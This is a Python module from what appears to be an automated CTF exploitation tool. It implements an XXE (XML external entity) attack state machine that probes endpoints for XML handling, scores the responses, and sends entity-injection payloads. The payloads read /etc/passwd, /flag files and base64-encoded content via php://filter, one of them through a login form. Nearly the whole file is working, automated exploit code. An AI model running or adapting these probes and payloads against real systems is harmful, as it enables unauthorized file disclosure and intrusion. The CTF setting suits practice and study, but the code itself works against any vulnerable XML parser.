"""XXE (XML External Entity) route state machine."""
from __future__ import annotations

from typing import Any, Callable, Dict, List, Optional, Tuple

import requests

from autopnex.ctf.route_state_machine import (
    RouteStateMachine,
    EvidenceScore,
    ProbeResult,
    MACHINE_REGISTRY,
)


class XXEMachine(RouteStateMachine):
    """State machine for XML External Entity injection.

    Detects XML content-type endpoints, XML login forms, and
    fetch/XMLHttpRequest patterns in JavaScript, then exploits
    via DTD entity injection to read files.
    """

    route = "xxe"

    def preconditions_met(self, blackboard_state: Dict[str, Any]) -> Tuple[bool, str]:
        # XXE is worth trying if we see XML content types or forms
        endpoints = blackboard_state.get("key_endpoints", [])
        forms = blackboard_state.get("forms", [])

        for ep in endpoints:
            snippet = ep.get("snippet", "").lower()
            if "xml" in snippet or "application/xml" in snippet:
                return True, "XML content detected in endpoint"

        for form in forms:
            fields = form.get("fields", [])
            if any("xml" in str(f).lower() for f in fields):
                return True, "XML-related form field detected"

        # Always worth a quick probe
        return True, "XXE probe is cheap — always worth trying"

    def get_probes(self) -> List[Tuple[str, str, Optional[Callable]]]:
        """Probe for XML acceptance."""
        return [
            ("xml_content_type", "<?xml version=\"1.0\"?><test>probe</test>", None),
            ("soap_endpoint", "/soap", None),
            ("xml_api", "/api/xml", None),
            ("xmlrpc", "/xmlrpc.php", None),
        ]

    def _send_probe(self, name: str, payload_template: str) -> requests.Response:
        """Override to send XML probes via POST with XML content-type."""
        if name == "xml_content_type":
            return self.session.post(
                self.target_url,
                data=payload_template,
                headers={"Content-Type": "application/xml"},
                timeout=8,
                allow_redirects=False,
            )
        # For path-based probes, just GET the path
        path = payload_template if payload_template.startswith("/") else "/"
        return self._get(path)

    def score_evidence(self, probe_name: str, response: requests.Response) -> EvidenceScore:
        text = response.text.lower() if response.text else ""
        status = response.status_code
        content_type = response.headers.get("Content-Type", "").lower()

        # XML response indicates XML processing
        if "xml" in content_type and status == 200:
            return EvidenceScore("xxe", 0.8, probe_name,
                                 "Server accepts and returns XML")

        # XML parsing errors indicate XML processing
        if any(sig in text for sig in ["xml parsing", "simplexml", "xmlparser", "lxml"]):
            return EvidenceScore("xxe", 0.85, probe_name,
                                 "XML parser error detected")

        # SOAP endpoint found
        if probe_name == "soap_endpoint" and status == 200:
            if "wsdl" in text or "soap" in text:
                return EvidenceScore("xxe", 0.8, probe_name,
                                     "SOAP endpoint detected")

        # xmlrpc.php found
        if probe_name == "xmlrpc" and status == 200:
            if "xml-rpc" in text or "xmlrpc" in text:
                return EvidenceScore("xxe", 0.75, probe_name,
                                     "XML-RPC endpoint detected")

        if status == 200 and len(text) > 0:
            return EvidenceScore("xxe", 0.2, probe_name,
                                 f"Endpoint responds (status {status})")

        return EvidenceScore("xxe", 0.0, probe_name,
                             f"No XXE indicators (status {status})")

    def get_exploit_steps(self) -> List[Dict[str, Any]]:
        """XXE exploit steps — try various entity injection payloads."""
        xxe_payloads = [
            # Basic file read via external entity
            {
                "name": "xxe_etc_passwd",
                "description": "XXE read /etc/passwd",
                "method": "POST",
                "path": "/",
                "data": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>',
                "headers": {"Content-Type": "application/xml"},
                "extract_flag": True,
            },
            # Read /flag
            {
                "name": "xxe_flag",
                "description": "XXE read /flag",
                "method": "POST",
                "path": "/",
                "data": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]><root><data>&xxe;</data></root>',
                "headers": {"Content-Type": "application/xml"},
                "extract_flag": True,
            },
            # Read /flag.txt
            {
                "name": "xxe_flag_txt",
                "description": "XXE read /flag.txt",
                "method": "POST",
                "path": "/",
                "data": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]><root><data>&xxe;</data></root>',
                "headers": {"Content-Type": "application/xml"},
                "extract_flag": True,
            },
            # Parameter entity variant
            {
                "name": "xxe_param_entity_flag",
                "description": "XXE parameter entity read /flag",
                "method": "POST",
                "path": "/",
                "data": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///flag"><!ENTITY callme "%xxe;">]><root><data>&callme;</data></root>',
                "headers": {"Content-Type": "application/xml"},
                "extract_flag": True,
            },
            # PHP wrapper variant
            {
                "name": "xxe_php_filter",
                "description": "XXE with php://filter",
                "method": "POST",
                "path": "/",
                "data": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag">]><root><data>&xxe;</data></root>',
                "headers": {"Content-Type": "application/xml"},
                "extract_flag": True,
            },
            # Login form XXE
            {
                "name": "xxe_login_form",
                "description": "XXE in login XML body",
                "method": "POST",
                "path": "/login",
                "data": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]><user><username>&xxe;</username><password>test</password></user>',
                "headers": {"Content-Type": "application/xml"},
                "extract_flag": True,
            },
        ]
        return xxe_payloads


# Register in MACHINE_REGISTRY
MACHINE_REGISTRY["xxe"] = XXEMachine
